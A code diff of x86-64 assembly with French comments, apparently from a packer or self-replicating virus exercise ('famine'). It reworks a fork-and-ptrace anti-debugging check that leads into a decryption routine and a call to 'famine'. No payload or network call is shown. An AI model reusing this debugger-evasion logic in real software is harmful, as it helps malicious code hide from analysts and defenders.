@@ -28,51 +28,14 @@ _fork:
     syscall
     cmp rax, 0              ; Vérifier si on est dans le parent ou l'enfant
     je _ptrace              ; Si rax == 0, c'est l'enfant
-    jl _end                 ; Si rax < 0, fork a échoué
+    jmp _end                 ; Si rax < 0, fork a échoué
 
-parent_process:
-    push    0x0a2e746E    ;    nt.\n
-    push    0x65726170    ;    pare
-
-    ;    write(stderr, "...WOODY...\n", 20)
-    mov        rax, 1        ;    syscall number
-    mov        rdi, 2        ;    stderr
-    mov        rsi, rsp    ;    "...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
-    mov        rdx, 16        ;    20
+exit0:
+    mov rdi, 0
+    mov rax, 60
     syscall
-
-    ;    Clear la stack pour pas avoir de problemes
-    pop    rax
-    pop    rax
-    
-    mov rdi, -1             ; pid = -1 (attendre n'importe quel enfant)
-    xor rsi, rsi            ; status = NULL
-    xor rdx, rdx            ; options = 0
-    mov rax, 61             ; waitpid syscall
-    syscall
-
-    ; Vérifier le code de retour de l'enfant
-    shr rsi, 8              ; Extraire le code de retour (exit status >> 8)
-    cmp rsi, 1             ; Si le code est 1, un débogueur a été détecté
-    je _end                 ; Sortir si un débogueur est détecté
-
-    jmp _manual_modif
 
 _ptrace:
-    push    0x0a2e746E     ;    nt.\n
-    push    0x61666E65    ;    enfa
-
-    ;    write(stderr, "...WOODY...\n", 20)
-    mov        rax, 1        ;    syscall number
-    mov        rdi, 2        ;    stderr
-    mov        rsi, rsp    ;    "...W\0\0\0\0OODY\0\0\0\0...\n", precedement push dans la stack
-    mov        rdx, 16        ;    20
-    syscall
-
-    ;    Clear la stack pour pas avoir de problemes
-    pop    rax
-    pop    rax
-
 
     xor rdi, rdi
     xor rsi, rsi
@@ -82,16 +45,10 @@ _ptrace:
     syscall
 
     cmp rax, 0
-    jne exit1
+    jne exit0
     
-	mov	rdi, rax
-    mov	rax, 60
-	syscall
+	jmp _manual_modif
 
-exit1:
-    mov rdi, 1
-    mov rax, 60
-    syscall
 
 _ptrace_end:
     nop
@@ -188,6 +145,7 @@ decrypt_done:
     pop    rax
 
 	call	famine	
+    jmp exit0
 
 _end:
 
